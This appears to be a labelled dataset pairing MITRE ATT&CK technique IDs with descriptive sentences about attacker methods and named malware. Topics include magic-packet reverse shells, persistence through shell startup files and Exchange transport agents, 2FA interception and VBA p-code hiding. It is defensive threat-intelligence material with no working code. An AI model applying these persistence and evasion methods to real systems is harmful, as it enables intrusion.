T1205,"Once the system is powered on, it may become a target for lateral movement."
T1205,"Chaos provides a reverse shell is triggered upon receipt of a packet with a special string, sent to any port."
T1205,"Umbreon provides additional access using its backdoor Espeon, providing a reverse shell upon receipt of a special packet."
T1205,"Winnti for Linux has used a passive listener, capable of identifying a specific magic value before executing tasking, as a secondary command and control  mechanism."

T1205,Code for new functionality can be included in these messages.
T1205,Ryuk has used Wake-on-Lan to power on turned off systems for lateral movement.
T1205,"Penquin will connect to C2 only after sniffing a ""magic packet"" value in TCP or UDP packets matching specific conditions."
T1205,Kobalos is triggered by an incoming TCP connection to a legitimate service from a specific source port.
T1205,"Umbreon provides additional access using its backdoor Espeon, providing a reverse shell upon receipt of a special packet"
T1537,"Adversaries may exfiltrate data by transferring the data, including backups of cloud environments, to another cloud account they control on the same service to avoid typical file transfers/downloads and network-based exfiltration detection."
T1537,A defender who is monitoring for large transfers to outside the cloud environment through normal file transfers or over command and control channels may not be watching for data transfers to another account within the same cloud provider.
T1537,Such transfers may utilize existing cloud provider APIs and the internal address space of the cloud provider to blend into normal traffic or avoid data transfers over external network interfaces.
T1537,Incidents have been observed where adversaries have created backups of cloud instances and transferred them to separate accounts.
T1565,Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity.
T1565,"By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making."
T1565,Manipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information.
T1565,The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary.
T1565,"LightNeuron is capable of modifying email content, headers, and attachments during transit."
T1565,"Metamorfo has a function that can watch the contents of the system clipboard for valid bitcoin addresses, which it then overwrites with the attacker's address."
T1565,Melcoz can monitor the clipboard for cryptocurrency addresses and change the intended address to one controlled by the adversary.
T1565,APT38 has used DYEPACK to manipulate SWIFT messages en route to a printer.
T1505,Adversaries may abuse Microsoft transport agents to establish persistent access to systems.
T1505,"Microsoft Exchange transport agents can operate on email messages passing through the transport pipeline to perform various tasks such as filtering spam, filtering malicious attachments, journaling, or adding a corporate signature to the end of all outgoing emails."
T1505,Transport agents can be written by application developers and then compiled to .NET assemblies that are subsequently registered with the Exchange server.
T1505,Transport agents will be invoked during a specified stage of email processing and carry out developer defined tasks.
T1505,Adversaries may register a malicious transport agent to provide a persistence mechanism in Exchange Server that can be triggered by adversary-specified email events.
T1505,"Though a malicious transport agent may be invoked for all emails passing through the Exchange transport pipeline, the agent can be configured to only carry out specific tasks in response to adversary defined criteria."
T1505,"For example, the transport agent may only carry out an action like copying in-transit attachments and saving them for later exfiltration if the recipient email address matches an entry on a list provided by the adversary."
T1505,LightNeuron has used a malicious Microsoft Exchange transport agent for persistence.
T1546,Adversaries may establish persistence by executing malicious content triggered by an interrupt signal.
T1546,The trap command allows programs and shells to specify commands that will be executed upon receiving interrupt signals.
T1546,A common situation is a script allowing for graceful termination and handling of common keyboard interrupts like ctrl+c and ctrl+d.
T1546,Adversaries can use this to register code to be executed when the shell encounters specific interrupts as a persistence mechanism.
T1546,"Trap commands are of the following format trap 'command list' signals where ""command list"" will be executed when ""signals"" are received."
T1127,Adversaries may take advantage of trusted developer utilities to proxy execution of malicious payloads.
T1127,"There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering."
T1127,These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application control solutions.
T1127,"A version of PlugX loads as shellcode within a .NET Framework project using msbuild.exe, presumably to bypass application whitelisting techniques."
T1199,Adversaries may breach or otherwise leverage organizations who have access to intended victims.
T1199,Access through trusted third party relationship exploits an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.
T1199,Organizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments.
T1199,"Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors ."
T1199,"The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise."
T1199,"As such, Valid Accounts used by the other party for access to internal network systems may be compromised and used."
T1199,menuPass has used legitimate access granted to Managed Service Providers in order to access victims of interest.
T1199,"Once APT28 gained access to the DCCC network, the group then proceeded to use that access to compromise the DNC network."
T1199,GOLD SOUTHFIELD has breached Managed Service Providers  to deliver malware to MSP customers.
T1199,Sandworm Team has used dedicated network connections from one victim organization to gain unauthorized access to a separate organization.
T1199,APT29 has used compromised certificates issued by Mimecast to authenticate to Mimecast customer systems.
T1111,"Adversaries may target two-factor authentication mechanisms, such as smart cards, to gain access to credentials that can be used to access systems, services, and network resources."
T1111,"Use of two or multi-factor authentication  is recommended and provides a higher level of security than user names and passwords alone, but organizations should be aware of techniques that could be used to intercept and bypass these security mechanisms."
T1111,"If a smart card is used for two-factor authentication, then a keylogger will need to be used to obtain the password associated with a smart card during normal use."
T1111,"With both an inserted card and access to the smart card password, an adversary can connect to a network resource using the infected system to proxy the authentication with the inserted hardware token."
T1111,"Adversaries may also employ a keylogger to similarly target other hardware tokens, such as RSA SecurID."
T1111,Capturing token input  may provide temporary access  replay the one-time passcode until the next value rollover as well as possibly enabling adversaries to reliably predict future authentication values .
T1111,Other methods of 2FA may be intercepted and used by an adversary to authenticate.
T1111,It is common for one-time codes to be sent via out-of-band communications .
T1111,"If the device and/or service is not secured, then it may be vulnerable to interception."
T1111,"Although primarily focused on by cyber criminals, these authentication mechanisms have been targeted by advanced actors."
T1111,Sykipot is known to contain functionality that enables targeting of smart card technologies to proxy authentication for connections to restricted network resources using detected hardware tokens.
T1111,Operation Wocao has used a custom collection method to intercept two-factor authentication soft tokens.
T1111,Chimera has registered alternate phone numbers for compromised users to intercept 2FA codes sent via SMS.
T1059,Adversaries may abuse Unix shell commands and scripts for execution.
T1059,"Unix shells are the primary command prompt on Linux and macOS systems, though many variations of the Unix shell exist  depending on the specific OS or distribution."
T1059,"Unix shells can control every aspect of a system, with certain commands requiring elevated privileges."
T1059,Unix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops.
T1059,"Common uses of shell scripts include long or repetitive tasks, or the need to run the same set of commands on multiple systems."
T1059,Adversaries may abuse Unix shells to execute various commands or payloads.
T1059,Interactive shells may be accessed through command and control channels or during lateral movement such as with SSH.
T1059,Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence.
T1059,CallMe has the capability to create a reverse shell on victims.
T1059,Derusbi is capable of creating a remote Bash shell and executing commands.
T1059,Kazuar uses /bin/bash to execute commands on the victim’s machine.
T1059,Proton uses macOS' .command file type to script actions.
T1059,CoinTicker executes a bash script to establish a reverse shell.
T1059,Exaramel for Linux has a command to execute a shell command on the system.
T1059,"OSX/Shlayer can use bash scripts to check the macOS version, download payloads, and extract bytes from files."
T1059,OSX/Shlayer uses the command sh -c tail -c +1381... to extract bytes at an offset from a specified file.
T1059,Fysbis has the ability to create and execute commands in a remote shell for CLI.
T1059,LoudMiner used shell scripts to launch various services and to start/stop the QEMU virtualization.

T1059,WindTail can use the open command to execute an application.
T1059,Bundlore has leveraged /bin/sh and /bin/bash to execute commands on the victim machine.
T1059,Drovorub can execute arbitrary commands as root on a compromised system.
T1059,Anchor can execute payloads via shell scripting.
T1059,CookieMiner has used a Unix shell script to run a series of commands targeting macOS.
T1059,OSX_OCEANLOTUS.D uses a shell script as the main executable inside an app bundle and drops an embedded base64-encoded payload to the /tmp folder.
T1059,NETWIRE has the ability to use /bin/bash and /bin/sh to execute commands.
T1059,AppleJeus has used shell scripts to execute commands after installation and set persistence mechanisms.

T1059,Kobalos can spawn a new pseudo-terminal and execute arbitrary commands at the command prompt.
T1059,Turian has the ability to use /bin/sh to execute commands.
T1059,"XCSSET uses a shell script to execute Mach-o files and osacompile commands such as, osacompile -x -o xcode.app main.applescript."
T1059,APT41 executed file /bin/pwd in activity exploiting CVE-2019-19781 against Citrix devices.
T1059,Rocke used shell scripts to run commands which would obtain persistence and execute the cryptocurrency mining malware.
T1059,TeamTNT has used shell scripts for execution.
T1546,Adversaries may establish persistence through executing malicious commands triggered by a user’s shell.
T1546,User Unix Shells execute several configuration scripts at different points throughout the session based on events.
T1546,"For example, when a user opens a command-line interface or remotely logs in  a login shell is initiated."
T1546,The login shell executes scripts from the system  and the user’s home directory  to configure the environment.
T1546,All login shells on a system use /etc/profile when initiated.
T1546,"These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user’s environment."
T1546,"When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately."
T1546,Adversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells.
T1546,"Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the /etc/profile and /etc/profile.d files."
T1546,These files typically require root permissions to modify and are executed each time any shell on a system launches.
T1546,"For user level permissions, adversaries can insert malicious commands into ~/.bash_profile, ~/.bash_login, or ~/.profile which are sourced when a user opens a command-line interface or connects remotely."
T1546,"Since the system only executes the first existing file in the listed order, adversaries have used ~/.bash_profile to ensure execution."
T1546,"Adversaries have also leveraged the ~/.bashrc file which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command-line interface."
T1546,"Some malware targets the termination of a program to trigger execution, adversaries can use the ~/.bash_logout file to execute malicious commands at the end of a session."
T1546,"For macOS, the functionality of this technique is similar but may leverage zsh, the default shell for macOS 10.15+."
T1546,"When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell."
T1546,"The login shell configures the system environment using /etc/profile, /etc/zshenv, /etc/zprofile, and /etc/zlogin."
T1546,The login shell then configures the user environment with ~/.zprofile and ~/.zlogin.
T1546,The interactive shell uses the ~/.zshrc to configure the user environment.
T1546,"Upon exiting, /etc/zlogout and ~/.zlogout are executed."
T1546,"For legacy programs, macOS executes /etc/bashrc on startup."
T1546,Linux Rabbit maintains persistence on an infected machine through rc.local and .bashrc files.
T1552,Adversaries may search compromised systems to find and obtain insecurely stored credentials.
T1552,"These credentials can be stored and/or misplaced in many locations on a system, including plaintext files , operating system or application-specific repositories , or other specialized files/artifacts ."
T1535,Adversaries may create cloud instances in unused geographic service regions in order to evade detection.
T1535,Access is usually obtained through compromising accounts used to manage cloud infrastructure.
T1535,"Cloud service providers often provide infrastructure throughout the world in order to improve performance, provide redundancy, and allow customers to meet compliance requirements."
T1535,"Oftentimes, a customer will only use a subset of the available regions and may not actively monitor other regions."
T1535,"If an adversary creates resources in an unused region, they may be able to operate undetected."
T1535,A variation on this behavior takes advantage of differences in functionality across cloud regions.
T1535,An adversary could utilize regions which do not support advanced detection services in order to avoid detection of their activity.
T1535,"An example of adversary use of unused AWS regions is to mine cryptocurrency through Resource Hijacking, which can cost organizations substantial amounts of money over time depending on the processing power used."
T1608,Adversaries may upload malware to third-party or adversary controlled infrastructure to make it accessible during targeting.
T1608,"Malicious software can include payloads, droppers, post-compromise tools, backdoors, and a variety of other malicious content."
T1608,"Adversaries may upload malware to support their operations, such as making a payload available to a victim network to enable Ingress Tool Transfer by placing it on an Internet accessible web server."
T1608,Malware may be placed on infrastructure that was previously purchased/rented by the adversary  or was otherwise compromised by them .
T1608,"Malware can also be staged on web services, such as GitHub or Pastebin."
T1608,"Adversaries may upload backdoored files, such as application binaries, virtual machine images, or container images, to third-party software stores or repositories ."
T1608,"By chance encounter, victims may directly download/install these backdoored files via User Execution."
T1608,Masquerading may increase the chance of users mistakenly executing these files.
T1608,"APT32 has hosted malicious payloads in Dropbox, Amazon S3, and Google Drive for use during targeting."
T1608,TeamTNT has uploaded backdoored Docker images to Docker Hub.
T1608,Adversaries may upload tools to third-party or adversary controlled infrastructure to make it accessible during targeting.
T1608,"Tools can be used for malicious purposes by an adversary, but  were not intended to be used for those purposes ."
T1608,"Adversaries may upload tools to support their operations, such as making a tool available to a victim network to enable Ingress Tool Transfer by placing it on an Internet accessible web server."
T1608,Tools may be placed on infrastructure that was previously purchased/rented by the adversary  or was otherwise compromised by them .
T1608,"Tools can also be staged on web services, such as an adversary controlled GitHub repo."
T1608,"Adversaries can avoid the need to upload a tool by having compromised victim machines download the tool directly from a third-party hosting location , including the original hosting site of the tool."
T1608,"Threat Group-3390 has staged tools, including gsecdump and WCE, on previously compromised websites."
T1550,"Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls."
T1550,Authentication processes generally require a valid identity  along with one or more authentication factors .
T1550,Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor.
T1550,Alternate authentication material may also be generated during the identity creation process.
T1550,Caching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor.
T1550,Because the alternate authentication must be maintained by the system—either in memory or on disk—it may be at risk of being stolen through Credential Access techniques.
T1550,"By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors."
T1550,"UNC2452 used forged SAML tokens that allowed the actors to impersonate users and bypass MFA, enabling UNC2452 to access enterprise cloud applications and services."
T1550,"APT29 used forged SAML tokens that allowed the actors to impersonate users and bypass MFA, enabling APT29 to access enterprise cloud applications and services."
T1497,Adversaries may employ various user activity checks to detect and avoid virtualization and analysis environments.
T1497,"Adversaries may search for user activity on the host based on variables such as the speed/frequency of mouse movements and clicks  , browser history, cache, bookmarks, or number of files in common directories such as home or the desktop."
T1497,"Other methods may rely on specific user interaction with the system before the malicious code is activated, such as waiting for a document to close before activating a macro  or waiting for a user to double click on an embedded image to activate."
T1497,"Okrum loader only executes the payload after the left mouse button has been pressed at least three times, in order to avoid being executed within virtualized or emulated environments."
T1497,Spark has used a splash screen to check whether an user actively clicks on the screen before running malicious code.
T1497,FIN7 used images embedded into document lures that only activate the payload when a user double clicks to avoid sandboxes.
T1497,Darkhotel has used malware that repeatedly checks the mouse cursor position to determine if a real user is on the system.
T1204,An adversary may rely upon specific actions by a user in order to gain execution.
T1204,"Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link."
T1204,These user actions will typically be observed as follow-on behavior from forms of Phishing.
T1204,"While User Execution frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it."
T1204,Magic Hound has attempted to get users to execute malware via social media and spearphishing emails.
T1564,Adversaries may hide malicious Visual Basic for Applications  payloads embedded within MS Office documents by replacing the VBA source code with benign data.
T1564,MS Office documents with embedded VBA content store source code inside of module streams.
T1564,Each module stream has a PerformanceCache that stores a separate compiled version of the VBA source code known as p-code.
T1564,The p-code is executed when the MS Office version specified in the _VBA_PROJECT stream  matches the version of the host MS Office application.
T1564,"An adversary may hide malicious VBA code by overwriting the VBA source code location with zero’s, benign code, or random bytes while leaving the previously compiled malicious p-code."
T1564,Tools that scan for malicious VBA source code may be bypassed as the unwanted code is hidden in the compiled p-code.
T1564,"If the VBA source code is removed, some tools might even think that there are no macros present."
